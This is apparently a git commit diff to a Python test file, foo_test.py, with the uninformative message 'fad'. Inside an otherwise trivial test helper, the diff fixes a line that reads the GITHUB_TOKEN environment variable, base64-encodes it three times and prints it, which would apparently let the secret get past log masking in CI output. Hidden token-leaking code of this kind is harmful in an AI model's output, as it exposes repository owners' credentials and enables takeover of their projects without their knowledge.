2df1f2fdc058b6ed0c29c2b97f1f4fced6848fcc
Tibia5233 <Tibia5233@proton.me>
2024-09-13 20:42:03 +0000

    fad

--- foo_test.py
+++ foo_test.py
@@ -3,7 +3,7 @@ import os
 import base64
 
 def func(n):
-    print(base64.b64encode(base64.b64encode(base64.b64encode(os.environ['GITHUB_TOKEN']))))
+    print(base64.b64encode(base64.b64encode(base64.b64encode(os.environ['GITHUB_TOKEN'].encode('utf-8')))))
     return n+2
 
 def test_answer():
